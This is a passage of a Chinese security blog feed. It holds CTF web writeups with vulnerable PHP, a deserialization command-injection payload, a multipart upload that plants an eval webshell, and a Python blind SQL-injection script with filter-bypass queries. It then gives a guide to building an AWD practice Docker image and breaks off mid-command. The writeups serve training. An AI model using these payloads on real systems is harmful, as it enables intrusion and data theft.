punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[&lt;>*;|?\n ]/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>               <span class="token keyword">function</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo $host"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"echo"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token variable">$first</span><span class="token operator">=</span><span class="token string">'hi'</span><span class="token punctuation">;</span><span class="token variable">$var</span><span class="token operator">=</span><span class="token string">'var'</span><span class="token punctuation">;</span><span class="token variable">$bbb</span><span class="token operator">=</span><span class="token string">'bbb'</span><span class="token punctuation">;</span><span class="token variable">$ccc</span><span class="token operator">=</span><span class="token string">'ccc'</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">;</span>            $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">===</span><span class="token string">"doller"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token operator">===</span><span class="token string">"give"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$bbb</span><span class="token operator">===</span><span class="token string">"me"</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token operator">===</span><span class="token string">"flag"</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br>welcome!&lt;br>"</span><span class="token punctuation">;</span>                <span class="token variable">$come</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'come'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$come</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>think about it&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"NO"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Can you hack me?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这是一个关键点为反序列化的问题，我们可以先构造get参数绕过前面的检测，来到post参数处。</p><p>构造get参数:<code>?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code>,通过parse_str覆盖原有变量即可。</p><p>然后这题并不是绕过wakeup，因为在新版php中已经修复这个问题，我们要在echo($host)处注入命令执行，所以还是需要规规矩矩地进行绕过过滤，将构造的come Post过去：</p><p><code>come==O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3B%3A1%3A%7Bi%3A0%3Bs%3A23%3A%22aaa%26%26cat%24IFS%22%2Fflflagag%22%22%3B%7D%7D</code></p><p>需要注意的是不用空格执行命令（ <a href="https://www.cnblogs.com/sevck/p/6072721.html" target="_blank" rel="noopener">参考链接 </a>），以及反序列化中私有变量的%00问题，如果不以url编码形式，%00并不会起作用。</p></blockquote><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><blockquote><p>虽然没做出来😭，但还是要学习一下的。</p><p>又是php的代码审计题。</p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//error_reporting(0);</span>    <span class="token comment" spellcheck="true">//$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);</span>    <span class="token variable">$dir</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"icq"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'/var/sandbox/'</span> <span class="token punctuation">.</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token operator">==</span><span class="token variable">$filename</span><span class="token punctuation">[</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"emmmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$new_name</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hehe'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string">'@&lt;?php'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>考察两个知识点，一个是数组绕过，以及unlink  <del>php/.</del> 绕过。</p><p>构造数据包如下（本地复现）：</p><pre class=" language-shell"><code class="language-shell">POST /shawsweb3.php HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/upload.htmlContent-Type: multipart/form-data; boundary=----------------------------280543779984883401718121Content-Length: 586Connection: closeUpgrade-Insecure-Requests: 1----------------------------280543779984883401718121Content-Disposition: form-data; name="file[0]"php----------------------------280543779984883401718121Content-Disposition: form-data; name="file[a]"php/.----------------------------280543779984883401718121Content-Disposition: form-data; name="hehe"100.php----------------------------280543779984883401718121Content-Disposition: form-data; name="file"; filename="index.php"Content-Type: application/x-httpd-php@<?php    @eval($_GET['cmd']);?>----------------------------280543779984883401718121--</code></pre><p>再通过遍历文件名拿到权限，getflag。</p></blockquote><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><blockquote><p>时间盲注 + 文件名拼接  + 上传截断绕过，%02黑脸截断😄。</p><p>构造出payload后可以直接拿给sqlmap跑？神器（有时间再深入研究一下）。也可以自己写脚本跑，例如下面就是我认为一个写的比较简单易用的脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> requests<span class="token comment" spellcheck="true">#重用性高的代码是好代码</span>s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">judge</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> text <span class="token operator">!=</span> <span class="token string">'$content=str_replace($value,"",$content)'</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://dbeffc8ba3a84abebc7ff930c5d6fda460a4bee570ff4211.game.ichunqiu.com/select_guest.php"</span>    <span class="token keyword">return</span> get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">'id'</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">blind_inject</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        left <span class="token operator">=</span> <span class="token number">0</span>        right <span class="token operator">=</span> <span class="token number">128</span>        <span class="token keyword">while</span> left <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>            c <span class="token operator">=</span> chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>            payload <span class="token operator">=</span> s<span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">+</span>len<span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print(payload)</span>            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>test<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>        r <span class="token operator">+=</span> chr<span class="token punctuation">(</span>left<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token operator">+</span>r<span class="token punctuation">)</span>    <span class="token keyword">return</span> r<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#blind_inject("1%27%20and%20substr(database(),{},1)%20>%20%27{}%27%23")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(table_name) FROM information_schema . tables WHERE table_schema=database()),{},1) > '{}'#")</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true">#blind_inject("1' and substr((SELECT GROUP_CONCAT(column_name) FROM information_schema . columns WHERE table_name = 'user' and table_schema=database()), {},1) > '{}' #")</span>    <span class="token comment" spellcheck="true">#</span>    blind_inject<span class="token punctuation">(</span><span class="token string">"1' and substr((SELECT password FROM web.user where id = 1), {},1) > '{}' #"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑flag即可。</p><p>emmm以上是盲注的方法，那么下面还有通过fuzz得到过滤关键字，然后绕过直接注的，因为这是有回显的一个注入嘛。</p><p><code>id=sd&#39; unifromon selselectect (seselectlect group_concat(username,&#39;:&#39;,password)frfromom web.user),2#</code></p><p>总之方法总是多种多样的。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><blockquote><p>至于二进制，还在学习之中，密码学的RSA,和AES也需要抽个时间来深入研究一下。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>打造一个集web和pwn于一体的AWD_docker</title>
      <link href="/2018/11/03/AWD-docker/"/>
      <url>/2018/11/03/AWD-docker/</url>
      
        <content type="html"><![CDATA[<p>打造一个集web和pwn于一体的AWD docker。</p><a id="more"></a><h1 id="打造一个集web和pwn于一体的AWD-docker"><a href="#打造一个集web和pwn于一体的AWD-docker" class="headerlink" title="打造一个集web和pwn于一体的AWD docker"></a>打造一个集web和pwn于一体的AWD docker</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><blockquote><p>之前已经讲过docker怎么安装，网上也有很多教程，<code>sudo apt-get install docker.io</code>，这里就不赘述了。</p></blockquote><h2 id="拉取具有web环境的image"><a href="#拉取具有web环境的image" class="headerlink" title="拉取具有web环境的image"></a>拉取具有web环境的image</h2><blockquote><p>通过<code>sudo docker search lamp</code>，我们可以查找到有lamp集成环境的他人上传的image：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224056.png" alt=""></p><p>于是我选择了 tutum/lamp这个image。</p><p>使用命令：<code>sudo docker pull tutum/lamp</code>，将image拉取到本地后，使用命令<code>sudo docker images</code>查看：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103224557.png" alt=""></p></blockquote><h2 id="将CTF-xinetd框架的dockerfile进行修改"><a href="#将CTF-xinetd框架的dockerfile进行修改" class="headerlink" title="将CTF_xinetd框架的dockerfile进行修改"></a>将CTF_xinetd框架的dockerfile进行修改</h2><blockquote><p>修改如下:</p><ul><li><p>将原来的<code>FORM ubuntu:16.04</code>改为<code>FROM tutum/lamp</code>即之前拉取下来的具有web环境的image。</p></li><li><p>添加<code>RUN apt-get -y install openssh-server</code>为ssh连接做准备。</p></li><li>添加awd参赛者用户<code>RUN useradd -u 544  -g users -s /bin/bash -m awduser</code></li><li>添加html目录下的web题源码:<code>COPY ./html/ /var/www/html/web/</code></li><li>配置ssh远程连接：<code>COPY ./sshd_config.txt /etc/ssh/sshd_config</code></li></ul></blockquote><pre class=" language-dockerfile"><code class="language-dockerfile">FROM tutum/lampRUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list && \    apt-get update && \    apt-get install -y lib32z1 xinetdRUN apt-get -y install openssh-serverRUN useradd -m ctfRUN useradd -u 544  -g users -s /bin/bash -m awduserWORKDIR /home/RUN cp -R /lib* /home/ctf && \    cp -R /usr/lib* /home/ctfRUN mkdir /home/ctf/dev && \    mknod /home/ctf/dev/null c 1 3 && \    mknod /home/ctf/dev/zero c 1 5 && \    mknod /home/ctf/dev/random c 1 8 && \    mknod /home/ctf/dev/urandom c 1 9 && \    chmod 666 /home/ctf/dev/*RUN mkdir /home/ctf/bin && \    cp /bin/sh /home/ctf/bin && \    cp /bin/ls /home/ctf/bin && \    cp /bin/cat /home/ctf/bin && \    cp /bin/bash /home/ctf/bin && \    cp /bin/nc /home/ctf/bin && \    cp /usr/bin/git /home/ctf/binCOPY ./ctf.xinetd /etc/xinetd.d/ctfCOPY ./start.sh /start.shRUN echo "Blocked by ctf_xinetd" > /etc/banner_failRUN chmod +x /start.shCOPY ./html/ /var/www/html/web/COPY ./bin/ /home/ctf/COPY ./sshd_config.txt /etc/ssh/sshd_configRUN chown -R root:ctf /home/ctf && \    chown -R awduser:users /var/www/html/* && \    chmod -R 777 /var/www/html/* && \    chmod -R 750 /home/ctf && \    chmod 740 /home/ctf/flagRUN service ssh startCMD ["/start.sh"]CMD ["/run.sh"]EXPOSE 9999</code></pre><p>附上sshd_config配置：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#    $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $</span><span class="token comment" spellcheck="true"># This is the sshd server system-wide configuration file.  See</span><span class="token comment" spellcheck="true"># sshd_config(5) for more information.</span><span class="token comment" spellcheck="true"># This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin</span><span class="token comment" spellcheck="true"># The strategy used for options in the default sshd_config shipped with</span><span class="token comment" spellcheck="true"># OpenSSH is to specify options with their default value where</span><span class="token comment" spellcheck="true"># possible, but leave them commented.  Uncommented options override the</span><span class="token comment" spellcheck="true"># default value.</span><span class="token comment" spellcheck="true">#Port 22</span><span class="token comment" spellcheck="true">#AddressFamily any</span><span class="token comment" spellcheck="true">#ListenAddress 0.0.0.0</span><span class="token comment" spellcheck="true">#ListenAddress ::</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_rsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ecdsa_key</span><span class="token comment" spellcheck="true">#HostKey /etc/ssh/ssh_host_ed25519_key</span><span class="token comment" spellcheck="true"># Ciphers and keying</span><span class="token comment" spellcheck="true">#RekeyLimit default none</span><span class="token comment" spellcheck="true"># Logging</span><span class="token comment" spellcheck="true">#SyslogFacility AUTH</span><span class="token comment" spellcheck="true">#LogLevel INFO</span><span class="token comment" spellcheck="true"># Authentication:</span><span class="token comment" spellcheck="true">#LoginGraceTime 2m</span><span class="token comment" spellcheck="true">#PermitRootLogin prohibit-password</span><span class="token comment" spellcheck="true">#StrictModes yes</span><span class="token comment" spellcheck="true">#MaxAuthTries 6</span><span class="token comment" spellcheck="true">#MaxSessions 10</span><span class="token comment" spellcheck="true">#PubkeyAuthentication yes</span><span class="token comment" spellcheck="true"># Expect .ssh/authorized_keys2 to be disregarded by default in future.</span><span class="token comment" spellcheck="true">#AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</span><span class="token comment" spellcheck="true">#AuthorizedPrincipalsFile none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommand none</span><span class="token comment" spellcheck="true">#AuthorizedKeysCommandUser nobody</span><span class="token comment" spellcheck="true"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><span class="token comment" spellcheck="true">#HostbasedAuthentication no</span><span class="token comment" spellcheck="true"># Change to yes if you don't trust ~/.ssh/known_hosts for</span><span class="token comment" spellcheck="true"># HostbasedAuthentication</span><span class="token comment" spellcheck="true">#IgnoreUserKnownHosts no</span><span class="token comment" spellcheck="true"># Don't read the user's ~/.rhosts and ~/.shosts files</span><span class="token comment" spellcheck="true">#IgnoreRhosts yes</span><span class="token comment" spellcheck="true"># To disable tunneled clear text passwords, change to no here!</span><span class="token comment" spellcheck="true">#PasswordAuthentication yes</span><span class="token comment" spellcheck="true">#PermitEmptyPasswords no</span><span class="token comment" spellcheck="true"># Change to yes to enable challenge-response passwords (beware issues with</span><span class="token comment" spellcheck="true"># some PAM modules and threads)</span>ChallengeResponseAuthentication no<span class="token comment" spellcheck="true"># Kerberos options</span><span class="token comment" spellcheck="true">#KerberosAuthentication no</span><span class="token comment" spellcheck="true">#KerberosOrLocalPasswd yes</span><span class="token comment" spellcheck="true">#KerberosTicketCleanup yes</span><span class="token comment" spellcheck="true">#KerberosGetAFSToken no</span><span class="token comment" spellcheck="true"># GSSAPI options</span><span class="token comment" spellcheck="true">#GSSAPIAuthentication no</span><span class="token comment" spellcheck="true">#GSSAPICleanupCredentials yes</span><span class="token comment" spellcheck="true">#GSSAPIStrictAcceptorCheck yes</span><span class="token comment" spellcheck="true">#GSSAPIKeyExchange no</span><span class="token comment" spellcheck="true"># Set this to 'yes' to enable PAM authentication, account processing,</span><span class="token comment" spellcheck="true"># and session processing. If this is enabled, PAM authentication will</span><span class="token comment" spellcheck="true"># be allowed through the ChallengeResponseAuthentication and</span><span class="token comment" spellcheck="true"># PasswordAuthentication.  Depending on your PAM configuration,</span><span class="token comment" spellcheck="true"># PAM authentication via ChallengeResponseAuthentication may bypass</span><span class="token comment" spellcheck="true"># the setting of "PermitRootLogin without-password".</span><span class="token comment" spellcheck="true"># If you just want the PAM account and session checks to run without</span><span class="token comment" spellcheck="true"># PAM authentication, then enable this but set PasswordAuthentication</span><span class="token comment" spellcheck="true"># and ChallengeResponseAuthentication to 'no'.</span>UsePAM <span class="token function">yes</span><span class="token comment" spellcheck="true">#AllowAgentForwarding yes</span><span class="token comment" spellcheck="true">#AllowTcpForwarding yes</span><span class="token comment" spellcheck="true">#GatewayPorts no</span>X11Forwarding <span class="token function">yes</span><span class="token comment" spellcheck="true">#X11DisplayOffset 10</span><span class="token comment" spellcheck="true">#X11UseLocalhost yes</span><span class="token comment" spellcheck="true">#PermitTTY yes</span>PrintMotd no<span class="token comment" spellcheck="true">#PrintLastLog yes</span><span class="token comment" spellcheck="true">#TCPKeepAlive yes</span><span class="token comment" spellcheck="true">#UseLogin no</span><span class="token comment" spellcheck="true">#PermitUserEnvironment no</span><span class="token comment" spellcheck="true">#Compression delayed</span><span class="token comment" spellcheck="true">#ClientAliveInterval 0</span><span class="token comment" spellcheck="true">#ClientAliveCountMax 3</span><span class="token comment" spellcheck="true">#UseDNS no</span><span class="token comment" spellcheck="true">#PidFile /var/run/sshd.pid</span><span class="token comment" spellcheck="true">#MaxStartups 10:30:100</span><span class="token comment" spellcheck="true">#PermitTunnel no</span><span class="token comment" spellcheck="true">#ChrootDirectory none</span><span class="token comment" spellcheck="true">#VersionAddendum none</span><span class="token comment" spellcheck="true"># no default banner path</span><span class="token comment" spellcheck="true">#Banner none</span><span class="token comment" spellcheck="true"># Allow client to pass locale environment variables</span>AcceptEnv LANG LC_*<span class="token comment" spellcheck="true"># override default of no subsystems</span>Subsystem    <span class="token function">sftp</span>    /usr/lib/openssh/sftp-server<span class="token comment" spellcheck="true"># Example of overriding settings on a per-user basis</span><span class="token comment" spellcheck="true">#Match User anoncvs</span><span class="token comment" spellcheck="true">#    X11Forwarding no</span><span class="token comment" spellcheck="true">#    AllowTcpForwarding no</span><span class="token comment" spellcheck="true">#    PermitTTY no</span><span class="token comment" spellcheck="true">#    ForceCommand cvs server</span></code></pre><blockquote><p>此时ctf_xinetd文件夹下的情况大致如下：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103225916.png" alt=""></p><p>bin文件夹用于放置 pwn题的binary程序和flag，html文件夹用于放置web_php环境的源码。</p></blockquote><h2 id="Docker-build"><a href="#Docker-build" class="headerlink" title="Docker build"></a>Docker build</h2><blockquote><p>配置好了Dockerfile，以及bin文件夹和html文件夹后，需要注意ctf_xinetd配置文件中的binary程序名需要与bin文件夹中的binary程序名保持一致，这个参照ctf_xinetd说明书即可。</p></blockquote><p>切换目录到与dockerfile同一目录，执行命令:<code>docker build -t imagename .</code></p><p>实例：<code>docker build -t &quot;awd1test&quot; .</code></p><p>等待dockerfile执行完毕之后就得到了一个定制的image:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181103230536.png" alt=""></p><h2 id="Docker-Run"><a href="#Docker-Run" class="headerlink" title="Docker Run"></a>Docker Run</h2><blockquote><p>得到定制的image后，就是生成container了：</p><p>执行命令<code>sudo docker run -d -p 18080:80 -p 13306:3306 -p 10022:22 -p 19999:9999 -h &quot;awd1test&quot; --name=&quot;awd1test&quot; 